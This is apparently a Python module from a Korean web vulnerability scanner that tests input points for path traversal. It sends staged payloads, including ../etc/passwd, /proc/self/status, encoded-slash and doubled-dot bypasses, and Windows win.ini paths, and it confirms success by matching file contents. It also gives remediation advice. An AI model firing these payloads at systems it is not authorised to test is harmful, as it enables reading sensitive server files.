"""고른 지점마다 경로 조작을 단계로 본다 — ① 받는 구간 → ② 기본 → ③ 심화 → ④ 우회.

모듈은 취약점별로 수집한 지점에 '전부 때리는' 구조다(사용자 결정 11-20). 지점마다 먼저 이 값이
파일 경로로 쓰이는 구간인지 보고, 후보로 남은 지점에만 페이로드를 늘려 넣는다. 확인되면 멈춘다.
디렉터리 구조 그리기·설정 캐기는 확인한 뒤 쓰는 심화 모듈(자료 경로 조작·퍼징)의 몫이다.

  ① 받는 구간  원래 값과 없는 이름(…_nx)의 응답이 갈리는가, 또는 파일 API 예외가 새는가 → 후보
               (파라미터 이름이 file·path·name 등이면 응답이 같아도 후보로 둔다)
  ② 기본       ../ 를 붙여 /etc/passwd
  ③ 심화       절대 경로, 더 깊이, /proc/self/status
  ④ 우회       ..../ 겹쳐 쓰기, 슬래시 인코딩, 이중 인코딩, 윈도 경로(..\\ win.ini)
읽기만 한다. 쓰기·삭제 경로는 보내지 않는다.
"""
import re

from dashboard import probe
from dashboard.core import Check

META = {
    "id": "traversal_probe",
    "name": "경로 조작 점검",
    "category": "경로 조작",
    "kisa": ["FD"],  # 주요정보통신기반시설 웹 항목(dashboard/standards.py)
    "vuln": "FILE",
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "kind": "active",
    "stage": "probe",
    "severity": "high",
    "attack": [{"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
               {"tactic": "TA0001", "technique": "T1190", "name": "Exploit Public-Facing Application"}],
    "description": "고른 지점마다 **① 받는 구간**(값이 파일 경로로 쓰이는지)을 먼저 보고, 후보에만 "
                   "② 기본(../etc/passwd) → ③ 심화(절대 경로·깊이·/proc) → ④ 우회(..../·인코딩·윈도 경로) 순서로 넣습니다. "
                   "구조 그리기·설정 캐기는 하지 않습니다 — 취약이 나오면 심화 모듈로 넘어갑니다.",
    "params": [
        {"name": "depth", "need": "optional", "label": "올라갈 단계", "type": "int", "default": "8",
         "help": "../ 를 몇 번 붙일지. 후보 지점마다 요청이 최대 12번 정도."},
    ],
}

UNIX = re.compile(r"(?m)^root:[x*!]?:0:0:")
PROC = re.compile(r"(?m)^(Name|Pid|PPid):\s")
WIN = re.compile(r"\[fonts\]|; for 16-bit app support", re.I)
FILE_ERR = re.compile(r"FileNotFoundException|NoSuchFileException|AccessDeniedException|java\.io\.\w+Exception|No such file")
FILE_NAMES = re.compile(r"file|path|name|doc|img|image|download|attach|page|template|lang", re.I)
_REC = ("받은 이름을 경로로 쓰지 말고 저장해 둔 파일 번호로 찾습니다. 경로로 써야 하면 정규화(canonical path) 뒤 "
        "허용한 폴더 안인지 확인하고 ../·절대 경로·인코딩된 구분자를 막습니다.")


def stages(depth):
    up = "../" * depth
    return {
        "basic": [(up + "etc/passwd", "../ 로 올라가기")],
        "deep": [("/etc/passwd", "절대 경로"), ("../" * (depth + 4) + "etc/passwd", "더 깊이"),
                 (up + "proc/self/status", "/proc/self")],
        "bypass": [("....//" * depth + "etc/passwd", "..../ 겹쳐 쓰기"),
                   (up.replace("/", "%2f") + "etc%2fpasswd", "슬래시 인코딩"),
                   (up.replace("../", "%2e%2e%2f") + "etc/passwd", "점 인코딩"),
                   ("..\\" * depth + "windows\\win.ini", "윈도 경로")],
    }


def _confirm(r, value):
    if UNIX.search(r.body):
        return ("경로 조작으로 서버 파일 읽힘(/etc/passwd)", "응답에 /etc/passwd 내용이 보임")
    if WIN.search(r.body):
        return ("경로 조작으로 서버 파일 읽힘(win.ini)", "응답에 win.ini 내용이 보임")
    if "proc" in value and PROC.search(r.body):
        return ("경로 조작으로 서버 파일 읽힘(/proc/self/status)", "응답에 /proc/self/status 내용이 보임")
    return None


def run(target, points, params):
    depth = max(1, min(12, int(params.get("depth") or 8)))
    out = []
    for p in points:
        lad = probe.Ladder(p)
        v = p.sample or "a"
        base = probe.send(p, v)
        nx = probe.send(p, v + "_nx" + probe.marker())
        lad.note("screen", f"원래 값 {base.status}·{len(base.body)}B / 없는 이름 {nx.status}·{len(nx.body)}B")
        leaked = FILE_ERR.search(nx.body)
        by_name = bool(FILE_NAMES.search(p.param))
        if leaked or (nx.status != base.status) or by_name:
            why = "파일 API 예외가 샘" if leaked else ("있는 이름·없는 이름의 응답이 갈림" if nx.status != base.status
                                                   else f"이름({p.param})이 파일 자리로 보임")
            lad.note("screen", f"후보 — {why}")
            for stage, payloads in stages(depth).items():
                if lad.try_payloads(stage, payloads, _confirm):
                    break
            if not lad.done and leaked:
                lad.maybe("screen", nx, "파일 예외는 새지만 페이로드로 파일을 읽지는 못함 — 다른 모양으로 더 볼 곳")
        else:
            lad.note("screen", "값이 파일 경로로 쓰이는 흔적 없음 — 받는 구간이 아님(후보 제외)")
        out.append(Check(point=p, verdict=lad.verdict, evidence="\n".join(lad.lines), response=lad.response or base,
                         title=lad.title, recommendation=_REC))
    return out
